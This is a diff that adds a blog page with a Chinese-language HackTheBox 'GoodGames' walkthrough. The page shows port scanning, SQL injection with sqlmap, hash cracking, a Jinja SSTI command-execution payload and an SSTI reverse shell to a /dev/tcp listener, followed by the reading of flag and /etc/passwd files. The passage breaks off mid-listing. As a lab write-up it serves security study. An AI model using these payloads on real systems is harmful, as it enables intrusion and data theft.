@@ -1,0 +1,738 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="信息收集：因为网络环境的原因，用Nmap扫描全端口会很慢，所以我决定先用masscan确定目标端口开放情况，再使用Nmap对指定端口调用脚本进行扫描，或许会快很多： 1234567&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.130 --rate 2000 -e tun0[sudo] mosaictheory 的密码：Starting mas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - GoodGames">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-GoodGames.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="信息收集：因为网络环境的原因，用Nmap扫描全端口会很慢，所以我决定先用masscan确定目标端口开放情况，再使用Nmap对指定端口调用脚本进行扫描，或许会快很多： 1234567&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.130 --rate 2000 -e tun0[sudo] mosaictheory 的密码：Starting mas">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514153839603.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514154319919.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514155537779.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514155651322.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514155717462.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514155844929.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514160349717.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514162303935.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514163039206.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514164120410.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514164613505.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514172943695.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.011Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.029Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514153839603.png">
+  
+  
+  
+  <title>HTB Walkthrough - GoodGames - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - GoodGames"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          92 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - GoodGames</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><p>因为网络环境的原因，用Nmap扫描全端口会很慢，所以我决定先用masscan确定目标端口开放情况，再使用Nmap对指定端口调用脚本进行扫描，或许会快很多：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.130 --rate 2000 -e tun0</span><br><span class="line">[sudo] mosaictheory 的密码：</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-14 07:08:44 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 80/tcp on 10.10.11.130                                    </span><br><span class="line">rate:  0.00-kpps, 100.00% <span class="keyword">done</span>, waiting -55-secs, found=1  </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; sudo nmap -sC -sV -Pn 10.10.11.130 -p80            </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-14 15:13 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.130</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.51</span><br><span class="line">|_http-title: GoodGames | Community and Store</span><br><span class="line">|_http-server-header: Werkzeug/2.0.2 Python/3.9.2</span><br><span class="line">Service Info: Host: goodgames.htb</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 21.96 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以先查询一下目标web信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; whatweb http://goodgames.htb</span><br><span class="line">http://goodgames.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]</span><br></pre></td></tr></table></figure>
+
+<p>可以先找一下相关漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; searchsploit Werkzeug                  </span><br><span class="line">------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                                                      |  Path</span><br><span class="line">------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Pallets Werkzeug 0.15.4 - Path Traversal                                            | python/webapps/50101.py</span><br><span class="line">Werkzeug - <span class="string">&#x27;Debug Shell&#x27;</span> Command Execution                                          | multiple/remote/43905.py</span><br><span class="line">Werkzeug - Debug Shell Command Execution (Metasploit)                               | python/remote/37814.rb</span><br><span class="line">------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
+
+<p>看起来Metasploit集成有漏洞利用模块，可以先对其进行一次漏洞测试，但在查看参数配置时候发现一些不对劲：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/http/werkzeug_debug_rce) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/werkzeug_debug_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     10.10.11.130     <span class="built_in">yes</span>       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki</span><br><span class="line">                                         /Using-Metasploit</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /console         <span class="built_in">yes</span>       URI to the console</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (python/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.16.4       <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br></pre></td></tr></table></figure>
+
+<p>它需要一个URL进行代码执行，但是默认的&#x2F;console是不行的，看来还是需要我去web页面看一眼，页面还挺棒：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514153839603.png" srcset="/img/loading.gif" lazyload alt="image-20220514153839603"  />
+
+<p>右上角有一个容易被人遗漏掉的人物图标，其实是一个登录按钮，而且是前端校验：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514154319919.png" srcset="/img/loading.gif" lazyload alt="image-20220514154319919"  />
+
+<p>万能密码就能登录，看来这套题的意义不在这里，登录成功后会进入用户配置页面，根据目前它为我显示的信息，我现在可能是管理员：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514155537779.png" srcset="/img/loading.gif" lazyload alt="image-20220514155537779"  />
+
+<p>整个页面只有一个更改密码的文本框，还要一些推特分享按钮，但是同样的在右上角一个会被人遗漏的地方，有一个齿轮图标：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514155651322.png" srcset="/img/loading.gif" lazyload alt="image-20220514155651322"></p>
+<p>点击它会获得一个新域名：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514155717462.png" srcset="/img/loading.gif" lazyload alt="image-20220514155717462"  />
+
+<p>或许我可以试着将IP地址写入到hosts文件中再试试，它可以，而我获取到了一个新的登录页面：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514155844929.png" srcset="/img/loading.gif" lazyload alt="image-20220514155844929"  />
+
+<p>或许我的账号可以使用，但是我没有密码， 而万能密码在这里不起作用，或许在数据库中会有一些其他信息，而我刚刚只是简单的使用万能密码登录成功便没有了下文，或许我可以去查询一下数据库中会不会有什么信息：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514160349717.png" srcset="/img/loading.gif" lazyload alt="image-20220514160349717"  />
+
+<h4 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a>SQL注入：</h4><p>可以把数据包保存下来通过SQLMAP去枚举，在数据库中有一串hash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; sqlmap -r /home/mosaictheory/GoodGames/payload.txt -D main -T user -C password --dump</span><br><span class="line">Database: main</span><br><span class="line">Table: user</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| password                         |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| 2b22337f218b2d82dfc3b6f77e7cb8ec |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>我不知道是什么算法，但是john会自主识别：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; john <span class="built_in">hash</span> -w=/usr/share/wordlists/rockyou.txt                </span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;dynamic=md5(<span class="variable">$p</span>)&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=dynamic=md5(<span class="variable">$p</span>)&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;HAVAL-128-4&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=HAVAL-128-4&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;MD2&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=MD2&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;mdc2&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=mdc2&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;mscash&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=mscash&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;mscash2&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=mscash2&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;NT&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=NT&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;Raw-MD4&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Raw-MD4&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;Raw-MD5&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Raw-MD5&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;Raw-MD5u&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Raw-MD5u&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;Raw-SHA1-AxCrypt&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Raw-SHA1-AxCrypt&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;ripemd-128&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=ripemd-128&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;Snefru-128&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Snefru-128&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;LM&quot;</span>, but the string is also recognized as <span class="string">&quot;ZipMonster&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=ZipMonster&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Using default target encoding: CP850</span><br><span class="line">Loaded 2 password hashes with no different salts (LM [DES 256/256 AVX2])</span><br><span class="line">Warning: poor OpenMP scalability <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=4</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">0g 0:00:00:01 DONE (2022-05-14 16:21) 0g/s 6619Kp/s 6619Kc/s 13238KC/s !!1QWER..*7¡VA</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure>
+
+<p>不过它似乎也不认识，但是谷歌帮我识别出来了，这还蛮意外的：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514162303935.png" srcset="/img/loading.gif" lazyload alt="image-20220514162303935"  />
+
+<p>我可以登录进去，并且在后台发现一个让我更改管理员名字的地方：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514163039206.png" srcset="/img/loading.gif" lazyload alt="image-20220514163039206"  />
+
+<h4 id="SSTI："><a href="#SSTI：" class="headerlink" title="SSTI："></a>SSTI：</h4><p>有可控参数，有回显，很明显的注入漏洞，XSS对我没什么意义，SQL注入我刚刚已经跑过了，那或许我能尝试一下SSTI，毕竟目标是个python环境：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514164120410.png" srcset="/img/loading.gif" lazyload alt="image-20220514164120410"  />
+
+<p>看起来可以，那么我可以试一下简单的payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; namespace.__init__.__globals__.os.popen(<span class="string">&#x27;id&#x27;</span>).<span class="built_in">read</span>() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514164613505.png" srcset="/img/loading.gif" lazyload alt="image-20220514164613505"  />
+
+<p>它看起来还是root，我需要登录到目标会更方便一些，因为我还需要普通用户的flag，而我现在还不知道它是谁：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; namespace.__init__.__globals__.os.popen(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.4/9001 0&gt;&amp;1&quot;&#x27;</span>).<span class="built_in">read</span>() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.4] from (UNKNOWN) [10.10.11.130] 45842</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@3a453ab39d3d:/backend<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">Dockerfile</span><br><span class="line">project</span><br><span class="line">requirements.txt</span><br><span class="line">root@3a453ab39d3d:/backend<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<h4 id="user-txt："><a href="#user-txt：" class="headerlink" title="user.txt："></a>user.txt：</h4><p>高兴的有点早，我还在一个Docker容器中，但它是有用户flag的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@3a453ab39d3d:/backend/project<span class="comment"># find / -name user.txt</span></span><br><span class="line">/home/augustus/user.txt</span><br><span class="line">root@3a453ab39d3d:/backend/project<span class="comment"># cat /home/augustus/user.txt </span></span><br><span class="line">55f60c29f........................</span><br><span class="line">root@3a453ab39d3d:/backend/project<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<p>但我搜了其他东西半天没什么文件，但是在&#x2F;etc&#x2F;passwd文件中，并没有augustus这个用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@3a453ab39d3d:/backend/project<span class="comment"># cat /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span 